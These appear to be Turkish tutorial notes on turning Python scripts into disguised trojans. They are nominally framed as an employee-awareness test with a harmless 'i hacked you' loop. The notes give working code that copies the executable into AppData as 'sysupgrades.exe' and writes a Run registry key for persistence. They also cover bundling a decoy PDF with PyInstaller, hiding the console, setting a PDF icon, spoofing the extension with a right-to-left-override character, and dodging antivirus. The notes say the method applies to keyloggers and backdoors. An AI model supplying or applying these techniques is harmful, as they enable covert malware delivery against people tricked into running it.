Python ile ilgili hiçbir şey olmayan bilgisyarda python kodlarını çalıştırmalıyız ve bu kodları paketlemeliyiz.
Ayrıca paketlemeyi yaparken hackerlar zararlı dosyaları (Keylogger, Backdoor vs.) nasıl normal bir dosyaymış gibi gösteriyor ona bakacağız.
Önce zararlı bir dosya yazacağız. Kendimiz üzerinde çalışabilelim diye. Terminalde "i hacked you" yazdıracağız.
Senaryo: Örneğin bir yerde çalışıyoruz. Siber güvenlik testi yapacağız ve çalışanlara bu dosyayı kandırarak çalıştırmaya çalışacağız ki güvensiz dosyaları çalıştırırsan hacklenirsin diyelim. O yüzden sisteme zarar vermeyen ama bir yandan da zararlı olabilecek dosyaları da aynı şekilde uygulayabileceğimiz yöntemler göreceğiz. 






MyPackage
---------
x = 0
while x < 100:
   print("i hacked you")
   x += 1



BÖYLE YAPARSAK EXE HALİNE ÇEVİRDİĞİMİZDE AÇILACAK BUNLARI YAZDIRIP KAPANACAK. 1 SANİYE BİLE SÜRMEZ.




DÜZENLEME
---------
import time
x = 0
while x < 100:
   print("i hacked you")
   x += 1
   time.sleep(0.5)


EN İŞLEVSİZ VİRÜSÜ YAZDIK. SADECE KULLANICIYI KIZDIRIR.





***pyinstaller yüklememiz gerek.
Yükledikten sonra nereye kaydettiğine bakalım.
python.exe dosyasının olduğu yere gideceğiz.
Path'te bazı gizli dosyalar olabilir. Bunları görebilmek için klasörün üstünden view diyip hidden items'ı tiklemen lazım.
Yüklediğimiz modül python.exe olduğu yerde scripts klasörünün altındadır.
pyinstaller.exe dosyasının yolunu terminale yazacağız.
MyPackage neredeyse o klasörde olursun (Masaüstüyse masaüstü...).
onefile: projemizde birden fazla dosya kullanıyorsak (time'ı import etmek gibi veya başka modüllerden bir fonksiyon, method vs. çağırmak gibi) bu onefile'ı kullanmamız gerekiyor ki tek bir exe şeklinde bütün ihtiyaçlarımızı toplasın.

C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile

4 dosya verir. Bir tanesi: dist. Bunun içinde projenin exe halini görebilirsin. Bu exe dosyasına çift tıklarsan proje çalışmaya başlar. 




DÜZENLEME (BU DOSYAYI HER BİLGİSAYAR AÇILDIĞINDA ÇALIŞTIRMAK)
-------------------------------------------------------------
Hackerlar bunu özellikle trojan ve backdoorlarda kullanır.
Kullanıcının haberi olmadan bilgisayar her çalıştığında arka planda çalışan dosya görürüz.

Windows'un search kısmına regedit (kayıt defteri düzenleyicisi) yazarız ve çalıştırırız.
Sol tarafta computer'ın altında bazı kullanıcılar gözükür. 
Biz HKEY_CURRENT_USER       kısmını açacağız. 
Onun altında Software       kısmını açacağız.
Onun altında Microsoft      kısmını açacağız.
Onun altında Windows        kısmını açacağız.
Onun altında CurrentVersion kısmını açacağız.
Onun altında Run         klasörüne gireceğiz.

RUN KLASÖRÜNE KOYDUĞUMUZ HER PROGRAM KULLANICI BİLGİSAYARI AÇTIĞINDA ÇALIŞIR.
SAĞ TIKLAYIP YENİ BİR ŞEY ATAYABİLİRSİN.
BUNU KODLA / KOMUTLA YAPMAMIZ GEREKİYOR.
TERMİNALDE BUNU YAPMA KOMUTU MEVCUTTUR.
EKLEYECEĞİMİZ YERE GİDİP HANGİ DEĞERLERİ EKLEYECEĞİMİZİ YAZARIZ: İSİM - TİP - DATA

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d "C:\Users\IEUser\AppData\upgrade.exe"

BUNU YAZIP ENTER'A BASINCA RUN KLASÖRÜNÜN ALTINA upgrade İSİMLİ ÇALIŞAN BİR DOSYA OLUŞTURURUZ.
HER AÇILIŞTA BİLGİSAYAR DEDİĞİMİZ YERE GİDECEK VE ORADA ÖYLE BİR DOSYA VARSA BUNU BULUP ÇALIŞTIRACAK. 




DÜZENLEME (KODUN İÇİNE KAYDETMEK)
---------------------------------
subprocess ile exe dosyamızı run içine kaydedebiliriz ama projem nerede çalıştırılıyor tam olarak bilmiyoruz ve bilsek bile kullanıcı bunu kapayıp oradan silebilir.
Örneğin exe dosyamızı kullanıcı masaüstüne kaydetti. Dosya açıldı ve run klasörüne eklendi. Ancak başka yere taşırsa veya silerse bir daha açtığında bu dosya masaüstünden silindiği için windows bunu bulamayacak ve açılışta çalıştıramayacak.
Program açıldığı gibi programın kendisini alsak, gizli bir dosyaya kopyalasak (AppData gibi) ve oradaki yolunu kaydetsek daha mantıklı olur. 







DÜZENLEME
---------
import time
import subprocess
import os
                                         HOMEPATH'i bul dedik.
new_file = os.environ["HOMEPATH"]   ---> Bilgisayar içerisindeki çevreyle ilgili bilgi verir.
print(new_file)

regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "                            ---> 2 ters slash işareti koyduk çünkü escape karakter olmadığını anlasın.



BU ŞEKİLDE ÇALIŞTIRILINCA Users\IEUser ÇIKTISINI VERİR.
BÖYLECE BU KOMUTLA BÜTÜN BİLGİSAYARLARDA USERS VE KULLANICI ADINI ALABİLİRİZ.
HOMEPATH YERİNE appdata YAZSAYDIN Users\IEUser\AppData\Roaming ÇIKTISINI VERİR. ROAMING ÇOK ÖNEMLİ DEĞİL. YANİ APPDATA'NIN YOLUNU ALDIK.









DÜZENLEME
---------
import time
import subprocess
import os
                                  
new_file = os.environ["appdata"] + "\\sysupgrades.exe"
print(new_file)

regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "   





BU SANA Users\IEUser\AppData\Roaming\sysupgrades.exe DİYE BİR YOL OLUŞTURUR.    
BU YOLU KULLANARAK İÇERİSİNDE BULUNDUĞUMUZ (bu proje) EXE'Yİ ALIRIZ VE BU İSİMLE (sysupgrades.exe) BU KLASÖRE (Roaming) KAYDEDERİZ.






DÜZENLEME (EXE'Yİ KAYDETMEK)
----------------------------
import time
import subprocess
import os
import shutil
import sys
                                  
new_file = os.environ["appdata"] + "\\sysupgrades.exe"

shutil.copyfile(sys.executable, new_file)
                     |______________|
                            |
         İçerisinde bulunduğumuz (bu proje) exe dosyasını new_file'a kopyala.

regedit_command="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
subprocess.call(regedit_command, shell=True) 




İÇERİSİNDE BULUNDUĞUMUZ EXECUTABLE'I (BU PROJEYİ) AL, new_file YERİNE KOPYALA.
new_file YERİ İÇİN ---> Users\IEUser\AppData\Roaming 'İN İÇERİSİNDE sysupgrades.exe DİYE BİR DOSYA OLUŞTUR DEDİK.
YANİ sysupgrades.exe İÇİNE BU PROJEYİ KOYUYORUZ, REGEDIT KOMUTU OLUŞTURUYORUZ.
REGEDIT KOMUTU YENİ OLUŞTURDUĞUMUZ DOSYAYI RUN KLASÖRÜNE YÜKLÜYOR. 
BUNU SUBPROCESS İLE KOMUTLARSAK BUNDAN SONRA BİLGİSAYAR HER AÇILDIĞINDA BU PROJENİN ÇALIŞMASINI SAĞLARIZ.








    Kullanıcıya zararlı bir şey bulaştırıldığında her bilgisayar açıldığında tekrar baştan o programın çalıştırılması
                |
DÜZENLEME (PERSISTENCE)
-----------------------
import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
                                  
   new_file = os.environ["appdata"] + "\\sysupgrades.exe"
   if not os.path.exists(new_file):  ---> Her seferinde çalışmasın, hata olmasın diye sadece dosya yoksa yapacağız
      shutil.copyfile(sys.executable, new_file)
      regedit_command="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
      subprocess.call(regedit_command, shell=True) 

add_to_registry()

x = 0
while x < 100:
   print("i hacked you")
   x += 1
   time.sleep(0.5)




PROJEMİZİ DOSYALAŞTIRIRIZ.

C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile

ARTIK BİR KERE BİLE OLUŞTURDUĞUMUZ EXE ÇALIŞTIRILSA HER BİLGİSAYAR AÇILDIĞINDA ÇALIŞIR.
KENDİNİ AppData\Roaming İÇERİSİNDE sysupgrades.exe OLARAK KOPYALADI.
REGEDIT'E BAKARSAN RUN İÇERİSİNDE upgrade'İ sysupgrade.exe OLARAK GÖREBİLİRSİN.
sysupgrades.exe'Yİ KENDİN GİRİP ÇALIŞTIRSAN DA YİNE "i hacked you" YAZILARINI GÖRÜRSÜN.














DÜZENLEME (DOSYAYI BAŞKA DOSYAYMIŞ GİBİ GÖSTERMEK)
--------------------------------------------------
Herhangi bir pdf dosyasını masaüstüne indirdin.
Bir şey yapmalıyız ki kullanıcı benim exe dosyama çift tıkladığında pdf açılsın.
Bunu yine paketleme sırasında yaparız.

C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\untitled.pdf;."

Bunu yapınca verdiğimiz datayı ve benim MyPackage.py dosyamı tek bir exe haline getirecektir.
Bunu yapmadan önce kodumuza dönüyoruz. Buraya bir data ekleyeceğimizi ve program açıldığında o datayı kullanıcıya göstermesi gerektiğini söylemeliyiz. 



import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
                                  
   new_file = os.environ["appdata"] + "\\sysupgrades.exe"
   if not os.path.exists(new_file):  
      shutil.copyfile(sys.executable, new_file)
      regedit_command="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
      subprocess.call(regedit_command, shell=True) 

add_to_registry()

def open_added_file():
   added_file = sys._MEIPASS + "\\untitled.pdf"
                     |                  ---> Bu kendi pdf'imiz. sys._MEIPASS klasörüne kaydedilir.
      Geçici bir klasör. Biz pyinstaller ile derleme yaparken buraya kaydedilir.        

   subprocess.Popen(added_file, shell=True)  ---> Dosyaları arka planda çalıştırmaya yarar. 
                            Threading gibi diğer tarafı bloklamadan bu işlemi yapar.

open_added_file()

x = 0
while x < 100:
   print("i hacked you")
   x += 1
   time.sleep(0.5)





C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\untitled.pdf;."

ARTIK BUNU ÇALIŞTIRABİLİRİZ.

Bunu dedikten sonra oluşan exe dosyasını açarsak pdf dosyası ve "i hacked you" kodumuz eş zamanlı çalışır.
Bunun gerçekten bir pdf olduğuna ikna etmeye çalışıyorum. Hiç terminal gösterilmesin diyorsak:









DÜZENLEME (SADECE PDF GÖSTERMEK)
--------------------------------
C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\untitled.pdf;." --noconsole

Konsol olmasın dedik.
Derlemeyi yapar.
Şu andaki projemizle çok mantıklı olmaz çünkü zaten projenin amacı "i hacked you" yazdırmak. Ancak her türlü python kodunda bunu kullanabilirsin (Keylogger, Backdoor vs.).
Bu şekilde çalıştırınca sadcece pdf açılır. Diğer taraf arka planda çalışır. Sana eklediğin dosyayı açar.


###***Örneğin subprocess.check_output komutunu noconsole çalıştırmak istiyorsun.
my_check = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
Standart input ve outputların devnull'a yani boşluğa eşit olması gerekiyor.
  







DÜZENLEME (İKONU DEĞİŞTİRMEK)
-----------------------------
Önce bir pdf ikonu bulmamız gerekiyor.
İnternetten bir pdf ikonunu masaüstüne kaydedersin ama png vs. formatında olur.
Bunu ikon dosyasına çevirmen gerekiyor. Yani sonu .ico olmalı.
Bunun için online toollardan birini kullanabilirsin.
png to ico convert online yazarsan birçok site bulabilirsin.
İkon dosyanı şu şekilde değiştirirsin:

C:\Users\IEUser\AppData\Local\Programs\Python\Python37-32\Scripts\pyinstaller.exe MyPackage.py --onefile --add-data "C:\Users\IEUser\Desktop\untitled.pdf;." --noconsole --icon "C:\Users\IEUser\Desktop\pdf.ico"








DÜZENLEME (.EXE İSMİNİ DEĞİŞTİRMEK)
-----------------------------------
exe dosyamızı Linux'e aktardık.
.exe'yi değiştirirsek exe dosyası Windows'ta çalışmaz ama değiştirmiş gibi yapabiliriz.

****TOOLX İNDİRİLDİ İSTEDİĞİN ZAMAN LINUX'TA TERMİNALE TOOLX YAZARAK ÇALIŞTIRABİLİRSİN.

Linux'te characters aracı var (Bende yok). 

Önce Leafpad (bir tane notepad) açıyoruz.
exe dosyamızın tam adını bu leafpad'e kopyalıyoruz.

characters içinde right-to-left-override'ı arıyoruz. Bu sağdan sola dizilimi değiştirir.
Yani dosya adımızı MyPackfdp.exe dersek ve son 7 karaktere right to left uygulayabilirsek exe ve pdf yerleri değişir.
right-to-left override'a tıklarız. Copy Character deriz. 
Leafpad'e kopyaladığımız yere gelip imleci k ve f arasına getirip ctrl+v yaparız ve değişiklik gerçekleşir.
Aslında bunun sonu halen exe ama burada biz yer değiştirmiş olduk.
Yer değiştirdiğimiz (MyPackexe.pdf) metnini kopyalayıp exe dosyamızı bununla rename ederiz.
***MyPack kısmını değiştirebilirsin.
Sonuçta MyPackexe.pdf bir exe uzantısı ama sonu pdf gibi gözüküyor.
Bunu Windows'a geri yolladığında uzantı değiştiği için virüs olarak algılanabilir.
***Linux aracı kullanmaktansa kendi aracımızı yazmak antivirüsler tarafından bizi daha az fark edilir kılar.
Antivirüsler hazır kodları yakalayarak bu işleri yapmaya çalışır.
Özellikle "i hacked you" yazdığımız için virüs olarak algılanabiliriz ama doğru düzgün değişken isimleriyle normal program gibi davranabiliriz.



































